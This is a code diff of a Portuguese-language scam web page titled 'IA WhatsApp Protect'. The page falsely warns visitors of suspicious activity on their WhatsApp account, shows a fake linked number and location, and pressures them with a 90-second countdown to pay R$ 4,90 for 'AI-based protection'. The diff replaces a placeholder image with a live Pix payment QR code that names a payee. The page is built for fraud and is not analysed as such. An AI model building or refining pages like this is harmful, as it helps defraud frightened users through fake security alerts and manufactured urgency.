@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>IA WhatsApp Protect</title>
   <style>
     body {
@@ -49,7 +49,7 @@
       font-size: 18px;
       cursor: pointer;
       border-radius: 5px;
-      margin-top: 20px;
+      margin-top: 15px;
     }
 
     .contador {
@@ -58,9 +58,10 @@
       margin-top: 20px;
     }
 
-    img {
+    img.qr-code {
       width: 220px;
       margin: 20px auto;
+      display: block;
     }
   </style>
 </head>
@@ -71,16 +72,20 @@
   <div class="alerta">⚠️ Atividade suspeita em seu <b>WhatsApp</b> detectada</div>
 
   <div class="info">
-    Seu número pode estar vinculado a outro aparelho: <b>+55 11 9XXX-26XX</b><br>
-    Localização suspeita: <b>São Paulo – 03:12h</b><br><br>
-    O sistema ativou automaticamente o protocolo <span class="negrito">IA WhatsApp Protect</span>, com escaneamento de ameaças em tempo real.<br><br>
-    <span class="negrito">Tecnologia baseada em Inteligência Artificial</span><br><br>
-    Valor único de proteção: <span class="negrito" style="color:red;">R$ 4,90</span><br>
-    (<i>IA WhatsApp Protect opera globalmente por menos de $1 USD</i>)<br><br>
+    Seu número pode estar vinculado a outro aparelho: <b>+55 11 9XXX-26XX</b><br />
+    Localização suspeita: <b>São Paulo – 03:12h</b><br /><br />
+    O sistema ativou automaticamente o protocolo <span class="negrito">IA WhatsApp Protect</span>, com escaneamento de ameaças em tempo real.<br /><br />
+    <span class="negrito">Tecnologia baseada em Inteligência Artificial</span><br /><br />
+    Valor único de proteção: <span class="negrito" style="color:red;">R$ 4,90</span><br />
+    (<i>IA WhatsApp Protect opera globalmente por menos de $1 USD</i>)<br /><br />
     <span class="negrito" style="color:green;">Faça a validação da proteção agora</span>
   </div>
 
-  <img src="SEU-QR-CODE-AQUI.png" alt="QR Code de Pagamento">
+  <!-- QR gerado automaticamente -->
+  <img
+    class="qr-code"
+    src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL%20INTERMEDIACOES%20LTDA6009SAO%20PAULO62070503***6304BAAB"
+    alt="QR Code de Pagamento" />
 
   <button class="pix-btn">Copiar Chave Pix</button>
 
@@ -88,7 +93,7 @@
 
   <script>
     let segundos = 90;
-    const timer = document.getElementById('timer');
+    const timer = document.getElementById("timer");
     const intervalo = setInterval(() => {
       segundos--;
       timer.textContent = `⏳ Sua autenticação expira em ${segundos} segundos.`;
@@ -101,3 +106,4 @@
   </script>
 </body>
 </html>
+
